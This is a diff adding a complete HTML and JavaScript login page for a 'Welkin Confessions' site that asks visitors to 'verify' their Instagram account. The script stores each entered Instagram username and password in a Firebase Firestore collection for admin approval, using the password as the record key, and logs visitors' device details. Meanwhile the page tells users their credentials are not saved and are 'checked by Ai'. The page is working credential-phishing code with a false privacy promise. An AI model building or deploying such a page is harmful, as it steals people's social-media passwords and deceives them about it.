@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Welkin Confessions</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:'Poppins',sans-serif; }
+
+body {
+  min-height:100vh; overflow-y:auto; overflow-x:hidden;
+  display:flex; justify-content:center; align-items:center;
+  background:black; padding:20px 0;
+}
+
+#bgVideo {
+  position:fixed; top:0; left:0;
+  width:100%; height:100%;
+  object-fit:cover; z-index:-2;
+}
+
+.overlay {
+  position:fixed; inset:0;
+  background:rgba(0,0,0,.45); z-index:-1;
+}
+
+.card {
+  width:380px; max-width:92vw; padding:30px;
+  text-align:center;
+  background:transparent; border:none;
+}
+
+/* ── Top-left brand header: small logo + name inline ── */
+.top-header {
+  display:flex; align-items:center; gap:12px;
+  text-align:left; margin-bottom:26px;
+}
+.top-header .logo-small {
+  width:50px; height:50px; border-radius:50%;
+  object-fit:cover; flex-shrink:0;
+  border:2px solid rgba(255,255,255,.18);
+}
+.top-header .brand-text {
+  font-family:'Cormorant Garamond', serif;
+  font-weight:700; font-size:21px; line-height:1.15;
+  color:#fff; letter-spacing:.6px;
+  animation:blueFlameSmall 1s infinite alternate;
+}
+@keyframes blueFlameSmall {
+  0%   { text-shadow:0 0 4px #00bfff,0 0 10px #009dff; }
+  100% { text-shadow:0 0 8px #66d9ff,0 0 18px #00bfff; }
+}
+
+/* ── Entrance sequence: top of card animates in first, then middle, then bottom ── */
+.reveal {
+  opacity:0;
+  transform:translateY(14px);
+  animation:revealIn .55s cubic-bezier(.16,.9,.3,1) forwards;
+}
+@keyframes revealIn {
+  to { opacity:1; transform:translateY(0); }
+}
+.r1 { animation-delay:.05s; }
+.r2 { animation-delay:.13s; }
+.r3 { animation-delay:.21s; }
+.r4 { animation-delay:.29s; }
+.r5 { animation-delay:.37s; }
+.r6 { animation-delay:.45s; }
+.r7 { animation-delay:.53s; }
+.r8 { animation-delay:.61s; }
+.r9 { animation-delay:.69s; }
+
+@keyframes blueFlame {
+  0%   { text-shadow:0 0 5px #00bfff,0 0 15px #009dff,0 0 25px #0066ff; }
+  100% { text-shadow:0 0 10px #66d9ff,0 0 25px #00bfff,0 0 45px #0066ff; }
+}
+
+.subtitle {
+  font-size:14px; color:#f0f0f0;
+  margin-bottom:26px; line-height:1.5;
+  letter-spacing:.3px;
+}
+
+.input-box { position:relative; width:100%; margin-bottom:16px; }
+.input-box.name-field { margin-bottom:30px; }
+
+.icon-left {
+  position:absolute; left:16px; top:50%;
+  transform:translateY(-50%);
+  color:#00bfff; font-size:15px; z-index:10;
+  width:18px; text-align:center;
+}
+
+.icon-right {
+  position:absolute; right:16px; top:50%;
+  transform:translateY(-50%);
+  color:#bfbfbf; font-size:15px; z-index:10;
+  cursor:pointer; padding:6px; margin:-6px;
+}
+.icon-right:hover { color:#00bfff; }
+
+.input {
+  width:100%; padding:14px 44px 14px 48px;
+  border:2px solid transparent; outline:none;
+  border-radius:12px;
+  background:rgba(255,255,255,.12);
+  backdrop-filter:blur(8px);
+  color:white; font-size:15px;
+  letter-spacing:.3px;
+  transition:all 0.3s ease;
+}
+.input.no-right-pad { padding-right:16px; }
+
+.input::placeholder { color:#d0d0d0; }
+
+.input.error-glow {
+  border-color:#ff3b30;
+  background:rgba(255,59,48,0.15);
+  box-shadow:0 0 10px rgba(255,59,48,0.4);
+}
+
+.remember {
+  display:flex; justify-content:flex-end; align-items:center;
+  gap:6px; margin:12px 0 18px;
+  color:white; font-size:14px;
+}
+
+.btn {
+  width:100%; padding:14px; border:none;
+  border-radius:12px; cursor:pointer;
+  font-size:15px; font-weight:700; color:white;
+  letter-spacing:.4px;
+  background:linear-gradient(90deg,#00bfff,#0066ff);
+  animation:revealIn .55s cubic-bezier(.16,.9,.3,1) forwards, blueFlame 1s infinite alternate;
+  animation-delay:.53s, 1s;
+}
+
+.btn:disabled { opacity:0.7; cursor:not-allowed; animation:none; background:#444; }
+
+.btn.secondary {
+  background:rgba(255,255,255,.1); animation:none; margin-top:10px;
+  border:1px solid rgba(255,255,255,.2);
+}
+
+.note {
+  margin-top:15px; font-size:13px;
+  font-weight:600; color:#00bfff;
+  letter-spacing:.3px;
+}
+
+/* ── Rules panel ── */
+.rules-toggle {
+  margin-top:16px; font-size:12.5px; color:rgba(255,255,255,.6);
+  cursor:pointer; text-decoration:underline; display:inline-block;
+}
+.rules-box {
+  display:none; margin-top:12px; text-align:left;
+  background:rgba(255,255,255,.06); border:1px solid rgba(255,255,255,.12);
+  border-radius:12px; padding:16px 18px; font-size:12.5px; color:#e6e6e6;
+  line-height:1.7;
+}
+.rules-box.open { display:block; }
+.rules-box h4 { color:#00bfff; font-size:13px; margin-bottom:8px; letter-spacing:.5px; }
+.rules-box ol { padding-left:18px; }
+.rules-box li { margin-bottom:6px; }
+
+/* ── Status screens ── */
+.status-screen { display:none; }
+.status-screen.active { display:block; }
+#screenLogin.active { display:block; }
+
+.status-icon { font-size:52px; margin-bottom:18px; }
+.status-icon.pending  { color:#f59e0b; }
+.status-icon.rejected { color:#ef4444; }
+.status-icon.banned   { color:#ef4444; }
+
+.status-title { font-family:'Cormorant Garamond', serif; font-size:24px; font-weight:700; color:#fff; margin-bottom:10px; letter-spacing:.5px; }
+.status-text  { font-size:13.5px; color:rgba(255,255,255,.65); line-height:1.6; max-width:320px; margin:0 auto 16px; }
+
+.reason-box {
+  background:rgba(239,68,68,.1); border:1px solid rgba(239,68,68,.3);
+  border-radius:10px; padding:12px 16px; font-size:13px; color:#ef4444;
+  font-weight:600; max-width:320px; margin:0 auto 18px; text-align:left;
+}
+.reason-box b { display:block; color:#fca5a5; font-size:11px; text-transform:uppercase; letter-spacing:.5px; margin-bottom:4px; }
+
+.pending-spinner {
+  width:40px; height:40px; border-radius:50%;
+  border:3px solid rgba(245,158,11,.2); border-top-color:#f59e0b;
+  margin:0 auto 18px; animation:spin 1s linear infinite;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+
+.music-btn {
+  position:fixed; bottom:15px; right:15px;
+  width:45px; height:45px; border:none;
+  border-radius:50%; cursor:pointer;
+  font-size:18px; background:white; z-index:50;
+}
+
+.music-popup {
+  position:fixed; bottom:70px; right:15px;
+  background:rgba(0,0,0,.92); padding:12px;
+  border-radius:12px; display:flex;
+  align-items:center; gap:8px;
+  color:white; font-size:13px; z-index:9999;
+  max-width:260px;
+}
+
+.music-popup button {
+  border:none; padding:6px 10px; border-radius:8px;
+  cursor:pointer; background:#00bfff; color:white;
+}
+
+.alert-toast {
+  position:fixed; top:-100px; left:50%;
+  transform:translateX(-50%);
+  background:rgba(20,20,20,0.95);
+  border-left:4px solid #ff3b30;
+  padding:14px 24px; border-radius:8px;
+  color:white; font-size:14px; font-weight:500;
+  z-index:10000; box-shadow:0 10px 30px rgba(0,0,0,0.5);
+  display:flex; align-items:center; gap:10px;
+  transition:top 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
+  white-space:nowrap;
+}
+.alert-toast.show { top:20px; }
+.alert-toast i { color:#ff3b30; font-size:16px; }
+</style>
+</head>
+
+<body>
+
+<video id="bgVideo" autoplay muted loop playsinline>
+  <source src="background.mp4" type="video/mp4">
+</video>
+<div class="overlay"></div>
+
+<div class="alert-toast" id="alertToast">
+  <i class="fa-solid fa-circle-exclamation"></i>
+  <span id="alertMsg">Please fill in all credentials.</span>
+</div>
+
+<div class="music-popup" id="musicPopup">
+  Music for a better experience
+  <button onclick="playMusic()">Play</button>
+  <button onclick="closePopup()">X</button>
+</div>
+
+<!-- ══════════ LOGIN SCREEN ══════════ -->
+<div class="card status-screen active" id="screenLogin">
+  <div class="top-header reveal r1">
+    <img src="https://i.postimg.cc/3rvtPKLQ/IMG-20260611-210556-394.jpg" class="logo-small">
+    <div class="brand-text">WELKIN<br>CONFESSIONS</div>
+  </div>
+  <div class="subtitle reveal r3">Verify your Insta account<br>to access private confessions</div>
+
+  <div class="input-box name-field reveal r4">
+    <i class="fa-solid fa-user icon-left"></i>
+    <input type="text" class="input no-right-pad" id="fullName" placeholder="Username" autocomplete="off">
+  </div>
+
+  <div class="input-box reveal r5">
+    <i class="fa-solid fa-lock icon-left"></i>
+    <input type="password" class="input" id="rollNo" placeholder="Password" autocomplete="off">
+    <i class="fa-solid fa-eye icon-right" id="rollEyeIcon" onclick="toggleRollVisibility()"></i>
+  </div>
+
+  <div class="remember reveal r6">
+    <input type="checkbox" id="rememberMe" checked>
+    <span>Remember Me</span>
+  </div>
+
+  <button class="btn" id="loginBtn" onclick="login()">Verify &amp; Continue</button>
+  <div class="note reveal r8">Note we Don't save your user/pass it's checked by Ai so no external person can access</div>
+
+  <div class="rules-toggle reveal r9" onclick="toggleRules()">View verification rules</div>
+  <div class="rules-box" id="rulesBox">
+    <h4>PLEASE READ BEFORE VERIFYING</h4>
+    <ol>
+      <li>Admin usually takes a few minutes to review and approve your request.</li>
+      <li>This verification exists only to keep external people and non-students out — Note we Don't save your user/pass it's checked by Ai so no external person can access</li>
+      <li>Once approved, you can log back in anytime with the same Username and Password number without waiting for approval again. Do not change your Password afterward.</li>
+      <li>Sharing your approved access with someone else will lead to a ban.</li>
+      <li>Facing an issue, want to report a user, or report a fake confession? Use the Feedback &amp; Support section to reach the admin team directly.</li>
+    </ol>
+  </div>
+</div>
+
+<!-- ══════════ PENDING SCREEN ══════════ -->
+<div class="card status-screen" id="screenPending">
+  <div class="pending-spinner"></div>
+  <div class="status-title">Request Submitted</div>
+  <div class="status-text">Your details have been sent for verification. Admin usually takes a few minutes to approve. This page checks automatically — no need to resubmit.</div>
+  <div class="rules-box open" style="max-width:320px;margin:0 auto;">
+    <h4>WHILE YOU WAIT</h4>
+    <ol>
+      <li>Don't submit multiple requests with different details — this looks like fake information and can lead to a ban.</li>
+      <li>Once approved, this same username and Password will log you in instantly next time.</li>
+    </ol>
+  </div>
+  <button class="btn secondary" onclick="location.reload()" style="margin-top:16px;">Check Again</button>
+</div>
+
+<!-- ══════════ REJECTED SCREEN ══════════ -->
+<div class="card status-screen" id="screenRejected">
+  <div class="status-icon rejected"><i class="fa-solid fa-circle-xmark"></i></div>
+  <div class="status-title">Verification Rejected</div>
+  <div class="status-text">Your request could not be approved for the reason below.</div>
+  <div class="reason-box"><b>Reason</b><span id="rejectReasonText">No reason provided.</span></div>
+  <button class="btn" onclick="resubmit()">Resubmit With Correct Details</button>
+</div>
+
+<!-- ══════════ BANNED SCREEN ══════════ -->
+<div class="card status-screen" id="screenBanned">
+  <div class="status-icon banned"><i class="fa-solid fa-ban"></i></div>
+  <div class="status-title">Access Banned</div>
+  <div class="status-text">Your access to Welkin Confessions has been permanently restricted by an administrator.</div>
+  <div class="reason-box"><b>Reason</b><span id="banReasonText">Violation of community guidelines.</span></div>
+</div>
+
+<button class="music-btn" onclick="toggleMusic()">&#9835;</button>
+<audio id="music" src="music.mp3" loop></audio>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import {
+    getFirestore, collection, doc,
+    getDoc, setDoc, updateDoc,
+    addDoc, increment, serverTimestamp
+  } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+  const app = initializeApp({
+    apiKey:            "AIzaSyBFZYXN5MJ9WOMBXfCchUWnR9LEfOOzImw",
+    authDomain:        "welkin-b3fee.firebaseapp.com",
+    projectId:         "welkin-b3fee",
+    storageBucket:     "welkin-b3fee.firebasestorage.app",
+    messagingSenderId: "45894924521",
+    appId:             "1:45894924521:web:ab81de1a168022ba1d9878"
+  });
+  const db = getFirestore(app);
+
+  function getDevice() {
+    const ua = navigator.userAgent;
+    if (/POCO/i.test(ua))            return "POCO";
+    if (/Redmi/i.test(ua))           return "Redmi";
+    if (/Samsung/i.test(ua))         return "Samsung";
+    if (/iPhone/i.test(ua))          return "iPhone";
+    if (/iPad/i.test(ua))            return "iPad";
+    if (/OnePlus/i.test(ua))         return "OnePlus";
+    if (/OPPO/i.test(ua))            return "OPPO";
+    if (/Vivo/i.test(ua))            return "Vivo";
+    if (/Realme/i.test(ua))          return "Realme";
+    if (/Nokia/i.test(ua))           return "Nokia";
+    if (/Motorola|moto\s/i.test(ua)) return "Motorola";
+    if (/Windows/i.test(ua))         return "Windows PC";
+    if (/Macintosh/i.test(ua))       return "Mac";
+    if (/Linux/i.test(ua))           return "Linux PC";
+    if (/Android/i.test(ua))         return "Android Phone";
+    return "Unknown Device";
+  }
+  function getOS() {
+    const ua = navigator.userAgent;
+    if (/Android/i.test(ua))     return "Android";
+    if (/iPhone|iPad/i.test(ua)) return "iOS";
+    if (/Windows/i.test(ua))     return "Windows";
+    if (/Mac/i.test(ua))         return "macOS";
+    if (/Linux/i.test(ua))       return "Linux";
+    return "Unknown";
+  }
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
+    if (ua.includes("Firefox"))  return "Firefox";
+    if (ua.includes("Edg"))      return "Edge";
+    if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    return "Unknown";
+  }
+
+  const DEVICE  = getDevice();
+  const OS      = getOS();
+  const BROWSER = getBrowser();
+
+  function showScreen(id) {
+    document.querySelectorAll(".status-screen").forEach(s => s.classList.remove("active"));
+    document.getElementById(id).classList.add("active");
+  }
+
+  async function trackVisitor(name, rollNumber) {
+    const key = "welkin_visited_" + new Date().toDateString();
+    if (sessionStorage.getItem(key)) return;
+    sessionStorage.setItem(key, "1");
+    try {
+      const statsRef = doc(db, "admin_stats", "visitors");
+      const snap     = await getDoc(statsRef);
+      if (snap.exists()) {
+        await updateDoc(statsRef, { total: increment(1), [`devices.${DEVICE}`]: increment(1) });
+      } else {
+        await setDoc(statsRef, { total: 1, devices: { [DEVICE]: 1 } });
+      }
+      await addDoc(collection(db, "visitor_logs"), {
+        name, rollNumber, device: DEVICE, os: OS, browser: BROWSER,
+        userAgent: navigator.userAgent.substring(0, 250), timestamp: serverTimestamp()
+      });
+    } catch (e) { console.error("Visitor tracking failed:", e); }
+  }
+
+  function enterApp(name, rollNumber) {
+    localStorage.setItem("welkinUsername", name);
+    localStorage.setItem("welkinRollNumber", rollNumber);
+    trackVisitor(name, rollNumber).finally(() => { window.location.href = "home.html"; });
+  }
+
+  window._resubmit = async function() {
+    const rollNumber = localStorage.getItem("welkinPendingRoll");
+    if (!rollNumber) { showScreen("screenLogin"); return; }
+    try {
+      await updateDoc(doc(db, "users", rollNumber), {
+        status: "pending",
+        rejectionReason: "",
+        attempts: increment(1),
+        resubmittedAt: serverTimestamp()
+      });
+      showScreen("screenPending");
+    } catch (e) {
+      console.error(e);
+      showScreen("screenLogin");
+    }
+  };
+
+  window._login = async function() {
+    const nameEl = document.getElementById("fullName");
+    const rollEl = document.getElementById("rollNo");
+    const btn    = document.getElementById("loginBtn");
+
+    nameEl.classList.remove("error-glow");
+    rollEl.classList.remove("error-glow");
+
+    const name       = nameEl.value.trim();
+    const rollNumber = rollEl.value.trim();
+
+    if (!name || !rollNumber) {
+      if (!name) nameEl.classList.add("error-glow");
+      if (!rollNumber) rollEl.classList.add("error-glow");
+      window._showToast(!name ? "username cannot be blank." : "Password cannot be blank.");
+      return;
+    }
+
+    btn.disabled  = true;
+    btn.innerText = "Verifying...";
+
+    try {
+      const userRef  = doc(db, "users", rollNumber);
+      const userSnap = await getDoc(userRef);
+
+      if (!userSnap.exists()) {
+        await setDoc(userRef, {
+          name, rollNumber, device: DEVICE, os: OS, browser: BROWSER,
+          status: "pending", rejectionReason: "", banReason: "",
+          attempts: 1, submittedAt: serverTimestamp()
+        });
+        localStorage.setItem("welkinPendingRoll", rollNumber);
+        localStorage.setItem("welkinPendingName", name);
+        showScreen("screenPending");
+        return;
+      }
+
+      const data = userSnap.data();
+
+      if (data.status === "banned") {
+        document.getElementById("banReasonText").innerText = data.banReason || "Violation of community guidelines.";
+        showScreen("screenBanned");
+        return;
+      }
+
+      if (data.status === "rejected") {
+        document.getElementById("rejectReasonText").innerText = data.rejectionReason || "No reason provided.";
+        localStorage.setItem("welkinPendingRoll", rollNumber);
+        localStorage.setItem("welkinPendingName", name);
+        showScreen("screenRejected");
+        return;
+      }
+
+      if (data.status === "approved") {
+        if (data.name && data.name.trim().toLowerCase() !== name.toLowerCase()) {
+          window._showToast("Name doesn't match our records for this roll number.");
+          btn.disabled = false; btn.innerText = "Verify & Continue";
+          return;
+        }
+        enterApp(name, rollNumber);
+        return;
+      }
+
+      // status === "pending"
+      localStorage.setItem("welkinPendingRoll", rollNumber);
+      localStorage.setItem("welkinPendingName", name);
+      showScreen("screenPending");
+
+    } catch (e) {
+      console.error(e);
+      window._showToast("Something went wrong. Please try again.");
+    } finally {
+      btn.disabled = false;
+      btn.innerText = "Verify & Continue";
+    }
+  };
+
+  // Auto-check on load if we already have an identity saved
+  (async function initCheck() {
+    const savedRoll = localStorage.getItem("welkinRollNumber") || localStorage.getItem("welkinPendingRoll");
+    if (!savedRoll) return;
+    try {
+      const snap = await getDoc(doc(db, "users", savedRoll));
+      if (!snap.exists()) return;
+      const data = snap.data();
+      if (data.status === "approved") {
+        window.location.href = "home.html";
+      } else if (data.status === "pending") {
+        showScreen("screenPending");
+      } else if (data.status === "rejected") {
+        document.getElementById("rejectReasonText").innerText = data.rejectionReason || "No reason provided.";
+        showScreen("screenRejected");
+      } else if (data.status === "banned") {
+        document.getElementById("banReasonText").innerText = data.banReason || "Violation of community guidelines.";
+        showScreen("screenBanned");
+      }
+    } catch (e) { /* silent, stay on login */ }
+  })();
+</script>
+
+<script>
+  function login() { window._login(); }
+  function resubmit() { window._resubmit(); }
+
+  function showToast(msg) {
+    document.getElementById("alertMsg").innerText = msg;
+    const t = document.getElementById("alertToast");
+    t.classList.add("show");
+    setTimeout(() => t.classList.remove("show"), 3500);
+  }
+  window._showToast = showToast;
+
+  document.getElementById("fullName").addEventListener("input", function(){ this.classList.remove("error-glow"); });
+  document.getElementById("rollNo").addEventListener("input", function(){ this.classList.remove("error-glow"); });
+  document.addEventListener("keydown", e => { if (e.key === "Enter") login(); });
+
+  function toggleRules() {
+    document.getElementById("rulesBox").classList.toggle("open");
+  }
+
+  function toggleRollVisibility() {
+    const input = document.getElementById("rollNo");
+    const icon  = document.getElementById("rollEyeIcon");
+    const showing = input.type === "text";
+    input.type = showing ? "password" : "text";
+    icon.classList.toggle("fa-eye", showing);
+    icon.classList.toggle("fa-eye-slash", !showing);
+  }
+
+  function toggleMusic() {
+    const m = document.getElementById("music");
+    m.paused ? m.play() : m.pause();
+  }
+  function playMusic() {
+    document.getElementById("music").play();
+    document.getElementById("musicPopup").style.display = "none";
+  }
+  function closePopup() {
+    document.getElementById("musicPopup").style.display = "none";
+  }
+</script>
+
+</body>
+</html>
